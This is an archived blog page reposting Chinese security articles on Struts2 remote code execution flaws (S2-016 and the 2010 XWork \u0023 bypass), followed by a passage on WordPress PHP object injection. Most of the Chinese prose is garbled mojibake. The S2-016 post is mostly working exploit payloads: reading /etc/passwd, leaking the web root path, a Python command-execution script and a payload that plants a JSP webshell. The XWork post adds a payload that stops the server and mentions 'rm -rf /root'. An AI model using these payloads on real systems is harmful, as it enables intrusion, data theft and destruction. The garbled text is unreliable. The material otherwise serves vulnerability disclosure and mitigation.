
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 93 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>æç¤º:</strong>æ‚¨çš„æµè§ˆå™¨ç‰ˆæœ¬å¤ªä½äº†,å»ºè®®å‡çº§åˆ° <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> ä»¥ä¸Š,æœ¬ç«™ä½¿ç”¨<a href="https://www.google.com/intl/zh-CN/chrome/">Chromeæµè§ˆå™¨</a>å¯ä»¥è·å¾—æœ€å¥½çš„æ˜¾ç¤ºæ•ˆæœ.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM/">[æ›´æ–°]Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T09:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h3 id="-struts2-s2-016-">[æ›´æ–°]Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰</h3>
<p><a href="">phper</a> @ <a href="http://www.freebuf.com/category/vuls" title="æŸ¥çœ‹ æ¼æ´ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">æ¼æ´</a> 2013-07-17   </p>
<p><strong>Strutsåˆçˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´äº†ï¼**</strong>åœ¨è¿™æ¬¡çš„æ¼æ´ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ“çºµå‚æ•°è¿œç¨‹æ‰§è¡Œæ¶æ„ä»£ç ã€‚<strong>**Struts 2.3.15.1ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå‚æ•°actionçš„å€¼redirectä»¥åŠredirectActionæ²¡æœ‰æ­£ç¡®è¿‡æ»¤ï¼Œå¯¼è‡´ognlä»£ç æ‰§è¡Œã€‚ </strong></p>
<p><strong>æè¿°</strong>
å½±å“ç‰ˆæœ¬ Struts 2.0.0 - Struts 2.3.15 æŠ¥å‘Šè€… Takeshi Terada of Mitsui Bussan Secure Directions, Inc. CVEç¼–å· CVE-2013-2251</p>
<p><strong>æ¼æ´è¯æ˜</strong></p>
<p>å‚æ•°ä¼šä»¥OGNLè¡¨è¾¾å¼æ‰§è¡Œ
<a href="http://host/struts2-blank/example/X.action?action:%25{3/*4}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{3/*4}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}</a></p>
<p>ä»£ç æ‰§è¡Œ</p>
<p><a href="http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a></p>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with â€œaction:â€ or â€œredirect:â€, followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms.</p>
<p>In Struts 2 before 2.3.15.1 the information following â€œaction:â€, â€œredirect:â€ or â€œredirectAction:â€ is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.</p>
<p><a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank">Apacheå®˜æ–¹åœ°å€</a></p>
<p><strong>å›½å†…ç½‘ç«™å—ç¾ä¸¥é‡</strong></p>
<p><strong><img src="http://static.freebuf.com/uploads/image/20130719/20130719234053_37320.jpg" alt="">
</strong></p>
<p><strong>ä»¥ä¸‹ä»…ä¾›æ•™å­¦ç ”ç©¶ä¹‹ç”¨ï¼Œä¸¥ç¦éæ³•ç”¨é€”ï¼</strong></p>
<p>æ‰§è¡Œä»»æ„å‘½ä»¤EXPï¼Œæ„Ÿè°¢Xæä¾›ï¼š
?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}</p>
<p>çˆ†ç½‘ç«™è·¯å¾„EXPï¼Œæ„Ÿè°¢h4ck0ræä¾›ï¼š</p>
<p>?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</p>
<p>pythonæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ„Ÿè°¢h4ck0ræä¾›</p>
<p>import urllib2,sys,re def get(url, data): string = url + &quot;?&quot; + data req = urllib2.Request(&quot;%s&quot;%string) response = urllib2.urlopen(req).read().strip() print strip(response) def strip(str): tmp = str.strip() blank<em>line=re.compile(&#39;\x00&#39;) tmp=blank<em>line.sub(&#39;&#39;,tmp) return tmp if <strong>name</strong> == &#39;__main</em></em>&#39;: url = sys.argv[1] cmd = sys.argv[2] cmd1 = sys.argv[3] attack=&quot;redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{&#39;%s&#39;,&#39;%s&#39;})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}&quot;%(cmd,cmd1) get(url,attack)</p>
<p>GETSHELL EXPï¼Œæ„Ÿè°¢coffeeæä¾›ï¼š</p>
<p>?redirect:${ %23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;), %23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;), new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close() }&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%</p>
<p>ç„¶åç”¨ä»¥ä¸‹ä»£ç å†™shell:</p>
&lt;form action=&quot;<a href="http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot" target="_blank">http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot</a>; method=&quot;post&quot;&gt; <textarea >code</textarea> <input type=submit value="æäº¤"> </form>

<p>ä¸Šå‰ç›®å½•ç”Ÿæˆ1.jsp</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/struts&Java/">struts&Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/struts&Java/" class="label label-primary">struts&Java</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-29 14:45:32"datetime="2014-03-29 14:45:32"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-Java--Struts2-XWorkå®‰å…¨æ¼æ´åŠè§£å†³åŠæ³•/">Struts2</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T09:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-Java--Struts2-XWorkå®‰å…¨æ¼æ´åŠè§£å†³åŠæ³•/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="struts2-xwork-">Struts2-XWork å®‰å…¨æ¼æ´åŠè§£å†³åŠæ³•</h1>
<p> ä½œè€…  <em>my_corner</em>
    å‘è¡¨æ—¶é—´ï¼š2010-07-24   æœ€åä¿®æ”¹ï¼š2010-07-27</p>
<p>exploit-dbç½‘ç«™åœ¨7æœˆ14æ—¥çˆ†å‡ºäº†ä¸€ä¸ªStruts2çš„è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç çš„æ¼æ´ã€‚
æ¼æ´åç§°ï¼šStruts2/XWork &lt; 2.2.0 Remote Command Execution Vulnerability
ç›¸å…³ä»‹ç»ï¼š</p>
<ul>
<li><a href="http://www.exploit-db.com/exploits/14360/" target="_blank">http://www.exploit-db.com/exploits/14360/</a></li>
<li><a href="http://sebug.net/exploit/19954/" target="_blank">http://sebug.net/exploit/19954/</a>
Struts2çš„æ ¸å¿ƒæ˜¯ä½¿ç”¨çš„webworkæ¡†æ¶ï¼Œå¤„ç† actionæ—¶é€šè¿‡è°ƒç”¨åº•å±‚çš„getter/setteræ–¹æ³•æ¥å¤„ç†httpçš„å‚æ•°ï¼Œå®ƒå°†æ¯ä¸ªhttpå‚æ•°å£°æ˜ä¸ºä¸€ä¸ªONGLï¼ˆè¿™é‡Œæ˜¯ONGLçš„ä»‹ç»ï¼‰è¯­å¥ã€‚å½“æˆ‘ä»¬æäº¤ä¸€ä¸ªhttpå‚æ•°ï¼š
?user.address.city=Bishkek&amp;user[&#39;favoriteDrink&#39;]=kumys
ONGLå°†å®ƒè½¬æ¢ä¸ºï¼š
action.getUser().getAddress().setCity(&quot;Bishkek&quot;) action.getUser().setFavoriteDrink(&quot;kumys&quot;)
è¿™æ˜¯é€šè¿‡ParametersInterceptorï¼ˆå‚æ•°è¿‡æ»¤å™¨ï¼‰æ¥æ‰§è¡Œçš„ï¼Œä½¿ç”¨ç”¨æˆ·æä¾›çš„HTTPå‚æ•°è°ƒç”¨ ValueStack.setValue()ã€‚
ä¸ºäº†é˜²èŒƒç¯¡æ”¹æœåŠ¡å™¨ç«¯å¯¹è±¡ï¼ŒXWorkçš„ParametersInterceptorä¸å…è®¸å‚æ•°åä¸­å‡ºç°â€œ/#â€å­—ç¬¦ï¼Œä½†å¦‚æœä½¿ç”¨äº†Javaçš„ unicodeå­—ç¬¦ä¸²è¡¨ç¤º\u0023ï¼Œæ”»å‡»è€…å°±å¯ä»¥ç»•è¿‡ä¿æŠ¤ï¼Œä¿®æ”¹ä¿æŠ¤Javaæ–¹å¼æ‰§è¡Œçš„å€¼ï¼š
æ­¤å¤„ä»£ç æœ‰ç ´åæ€§ï¼Œè¯·åœ¨æµ‹è¯•ç¯å¢ƒæ‰§è¡Œï¼Œä¸¥ç¦ç”¨æ­¤ç§æ–¹æ³•è¿›è¡Œæ¶æ„æ”»å‡»
?(&#39;\u0023_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(meh)=true&amp;(aaa)((&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003d\u0023foo&#39;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#39;\u0023rt.exit(1)&#39;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
è½¬ä¹‰åæ˜¯è¿™æ ·ï¼š
?(&#39;/#_memberAccess[&#39;allowStaticMethodAccess&#39;]&#39;)(meh)=true&amp;(aaa)((&#39;/#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=/#foo&#39;)(/#foo=new%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#39;/#rt.exit(1)&#39;)(/#rt=@java.lang.Runtime@getRuntime()))=1
OGNLå¤„ç†æ—¶æœ€ç»ˆçš„ç»“æœå°±æ˜¯java.lang.Runtime.getRuntime().exit(1);
ç±»ä¼¼çš„å¯ä»¥æ‰§è¡Œjava.lang.Runtime.getRuntime().exec(&quot;rm â€“rf /root&quot;)ï¼Œåªè¦æœ‰æƒé™å°±å¯ä»¥åˆ é™¤ä»»ä½•ä¸€ä¸ªç›®å½•ã€‚
ç›®å‰å°è¯•äº†3ä¸ªè§£å†³æ–¹æ¡ˆï¼š
<strong>1.å‡çº§åˆ°struts2.2ç‰ˆæœ¬ã€‚</strong>
è¿™ä¸ªå¯ä»¥é¿å…è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯strutså¼€å‘å›¢é˜Ÿæ²¡æœ‰releaseè¿™ä¸ªç‰ˆæœ¬ï¼ˆåŒ…æ‹¬æœ€æ–°çš„2.2.1ç‰ˆæœ¬éƒ½æ²¡æœ‰releaseï¼‰ï¼Œç»æˆ‘æµ‹è¯•å‘ç°æ–°ç‰ˆæœ¬è™½ç„¶è§£å†³äº†ä¸Šè¿°çš„æ¼æ´ï¼Œä½†æ˜¯æ–°çš„é—®é¢˜æ˜¯strusæ ‡ç­¾å‡ºé—®é¢˜äº†ã€‚
<s:bean id="UserUtil" name="cn.com.my_corner.util.UserUtil"></s:bean> <s:property value="/#UserUtil.getType().get(cType.toString())" />
è¿™æ ·çš„æ ‡ç­¾åœ¨struts2.0ä¸­æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä½†æ˜¯æ–°ç‰ˆä¸­å°±ä¸è§£æäº†ï¼ŒåŸå› å°±æ˜¯â€œ/#â€çš„é—®é¢˜å¯¼è‡´çš„ï¼Œè¡¥äº†æ¼æ´ï¼Œæ­£å¸¸çš„ä½¿ç”¨ä¹Ÿç”¨ä¸äº†äº†ã€‚
æ‰€ä»¥sebugç½‘ç«™ä¸Šçš„å»ºè®®å‡çº§åˆ°2.2ç‰ˆæœ¬æ˜¯ä¸å¯è¡Œçš„ã€‚
<strong>2.strutså‚æ•°è¿‡æ»¤ã€‚</strong>
<interceptor-ref name="params"> <param name="excludeParams">./<em>\u0023./</em></param> </interceptor-ref>
è¿™ä¸ªå¯ä»¥è§£å†³æ¼æ´é—®é¢˜ï¼Œç¼ºç‚¹æ˜¯å·¥ä½œé‡å¤§ï¼Œæ¯ä¸ªé¡¹ç›®éƒ½å¾—æ”¹strutsé…ç½®æ–‡ä»¶ã€‚å¦‚æœé¡¹ç›®é‡Œï¼Œæ˜¯å¼•ç”¨çš„ä¸€ä¸ªç±»ä¼¼global.xmlçš„é…ç½®æ–‡ä»¶ï¼Œå·¥ä½œé‡ç›¸åº”å‡å°‘ä¸€äº›ã€‚
<strong>3.åœ¨å‰ç«¯è¯·æ±‚è¿›è¡Œè¿‡æ»¤ã€‚</strong>
æ¯”å¦‚åœ¨ngnixï¼Œapacheè¿›è¡Œæ‹¦æˆªï¼Œå‚æ•°ä¸­å¸¦æœ‰\u0023çš„ä¸€å¾‹è§†ä¸ºæ”»å‡»ï¼Œè·³è½¬åˆ°404é¡µé¢æˆ–è€…åˆ«çš„ä»€ä¹ˆé¡µé¢ã€‚è¿™æ ·åšçš„ä¸€ä¸ªå‰æå°±æ˜¯æ²¡äººæŠŠ/#å·è½¬ç åä½œä¸ºå‚æ•°ä¼ é€’ã€‚
ç›®å‰æ¥çœ‹åä¸¤ç§æ˜¯æ¯”è¾ƒæœ‰æ•ˆçš„æ–¹æ³•ï¼Œé‡‡ç”¨ç¬¬ä¸‰ç§æ–¹æ³•æ¯”è¾ƒç®€ä¾¿ã€‚æ˜¯å¦æœ‰å¦å¤–çš„è§£å†³åŠæ³•ï¼Œæ¬¢è¿å¤§å®¶è®¨è®ºã€‚
æˆ‘å¹¶æ²¡æœ‰åœ¨windowsç¯å¢ƒä¸‹æµ‹è¯•ï¼Œæœ‰åŒå­¦åœ¨windowsä¸‹æ²¡æœ‰è¯•éªŒæˆåŠŸï¼Œè¿™å¹¶ä¸èƒ½è¯´æ˜windowsä¸‹å°±æ²¡æœ‰é£é™©å¯èƒ½æ˜¯æˆ‘ä»¬çš„å‚æ•°æˆ–è€…ä»€ä¹ˆåœ°æ–¹æœ‰é—®é¢˜è€Œå·²ã€‚æ—¢ç„¶æ¼æ´çš„ç¡®å­˜åœ¨ï¼Œå’±ä»¬å°±è¦é‡è§†å¯¹å§ã€‚æ¬¢è¿å¤§å®¶æµ‹è¯•ï¼Œæ˜¯å¦windowsä¸‹æ¼æ´ä¸èƒ½æ‰§è¡ŒæˆåŠŸã€‚</li>
</ul>
<p>è¿™ä¸‰ç§æ–¹æ³•ï¼Œå‡å·²é€šè¿‡æµ‹è¯• </p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/Java/">Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Java/" class="label label-primary">Java</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-29 14:31:34"datetime="2014-03-29 14:31:34"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-Java--Struts2-XWorkå®‰å…¨æ¼æ´åŠè§£å†³åŠæ³•/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-Java--Struts2-XWorkå®‰å…¨æ¼æ´åŠè§£å†³åŠæ³•" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/">WordPress </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T09:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h2 id="-wordpress-3-6-1-php-http-drops-wooyun-org-papers-596-"><a href="http://drops.wooyun.org/papers/596" target="_blank">WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´</a></h2>
<p>2013/09/13 11:36  | <a href="http://drops.wooyun.org/author/äº”é“å£æ€æ°”" title="ç”± äº”é“å£æ€æ°” å‘å¸ƒ" target="_blank">äº”é“å£æ€æ°”</a>  </p>
<p>From:<a href="http://vagosec.org/2013/09/wordpress-php-object-injection/" target="_blank">WordPress &lt; 3.6.1 PHP Object Injection</a></p>
<h2 id="0x00-">0x00 èƒŒæ™¯</h2>
<p>å½“æˆ‘è¯»åˆ°ä¸€ç¯‡å…³äºJoomlaçš„â€œPHPå¯¹è±¡æ³¨å°„â€çš„æ¼æ´blogåï¼Œæˆ‘æŒ–æ·±äº†ä¸€ç‚¹å°±å‘ç°Stefan Esserå¤§ç¥åœ¨2010å¹´é»‘å¸½å¤§ä¼šçš„æ–‡ç« ï¼š</p>
<p><a href="http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf" target="_blank"><a href="http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf">http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf</a></a></p>
<p>è¿™ç¯‡æ–‡ç« æåˆ°äº†PHPä¸­çš„unserializeå‡½æ•°å½“æ“ä½œç”¨æˆ·ç”Ÿæˆçš„æ•°æ®çš„æ—¶å€™ä¼šäº§ç”Ÿå®‰å…¨æ¼æ´ã€‚</p>
<p>æ‰€ä»¥å‘¢ï¼ŒåŸºæœ¬æ¥è¯´ï¼Œunserializeå‡½æ•°æ‹¿åˆ°è¡¨ç°ä¸ºåºåˆ—åŒ–çš„æ•°æ®ï¼Œç„¶åå°±è§£åºåˆ—åŒ–å®ƒï¼ˆunserializeå˜›ï¼Œå½“ç„¶å°±å¹²è¿™ä¸ªå•Š~ï¼‰ä¸ºphpçš„å€¼ã€‚è¿™ä¸ªå€¼å®ƒå¯ä»¥æ˜¯resourceä¹‹å¤–çš„ä»»ä½•ç±»å‹ï¼Œå¯ä¸ºï¼ˆinteger, double, string, array, boolean, object, NULLï¼‰ï¼Œå½“è¿™ä¸ªå‡½æ•°æ“ä½œä¸€ä¸ªç”¨æˆ·ç”Ÿæˆçš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œåœ¨ä½ç‰ˆæœ¬çš„PHPä¸­å¯èƒ½ä¼šäº§ç”Ÿå†…å­˜æ³„éœ²çš„æ¼æ´ï¼Œå½“ç„¶è¿™ä¹Ÿä¸æ˜¯è¿™ç¯‡blogè¦å…³æ³¨çš„é—®é¢˜ã€‚å¦‚æœä½ å¯¹è¿™ä¸ªé—®é¢˜æ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥å†å»çœ‹çœ‹æˆ‘ä¸Šé¢è¯´çš„å¤§ç¥çš„æ–‡ç« ã€‚</p>
<p>å¦å¤–ä¸€ç§æ”»å‡»æ–¹å¼å‘ç”Ÿåœ¨å½“æ”»å‡»è€…çš„è¾“å…¥è¢«unserializeå‡½æ•°æ“ä½œçš„æ—¶å€™ï¼Œè¿™ç§å°±æ˜¯æˆ‘è¯´åˆ°çš„â€œPHPå¯¹è±¡æ³¨å…¥â€ã€‚åœ¨è¿™ç§æ–¹å¼ä¸­ï¼Œå¯¹è±¡ç±»å‹çš„è¢«unserializeçš„è¯ï¼Œå…è®¸æ”»å‡»è€…è®¾ç½®ä»–é€‰æ‹©å¯¹è±¡çš„å±æ€§ã€‚å½“è¿™äº›å¯¹è±¡ä¸­çš„æ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šå‡ºç°ä¸€äº›æ•ˆæœï¼ˆä¾‹å¦‚ï¼šåˆ é™¤ä¸€äº›æ–‡ä»¶ï¼‰ï¼Œå½“æ”»å‡»è€…å¯ä»¥å»é€‰æ‹©å¯¹è±¡é‡Œçš„ä¸€äº›å±æ€§çš„æ—¶å€™ï¼Œä»–å°±èƒ½å¤Ÿåˆ é™¤ä¸€ä¸ªä»–æ‰€æäº¤çš„æ–‡ä»¶ã€‚</p>
